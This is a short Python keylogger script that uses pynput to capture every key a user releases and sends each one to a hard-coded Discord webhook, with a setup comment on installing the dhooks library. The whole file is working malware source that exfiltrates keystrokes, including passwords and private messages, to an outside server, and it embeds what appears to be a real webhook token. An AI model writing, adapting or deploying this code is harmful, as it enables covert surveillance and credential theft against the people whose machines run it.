#pip install dhooks   " Python3 "
from pynput import keyboard
from dhooks import Webhook

hook=Webhook("https://discord.com/api/webhooks/916566863981449257/aXTw2tEKc_SoWdumTBaXM0yS5yWLDCZ3HDQfq4R_-2EE1TuqDA9tjIQHZqkZIYHlmjnV")

def on_release(key):
    hook.send(str(key))
    print("key sent to your channel")
with keyboard.Listener(on_release=on_release) as Listener:
    Listener.join()
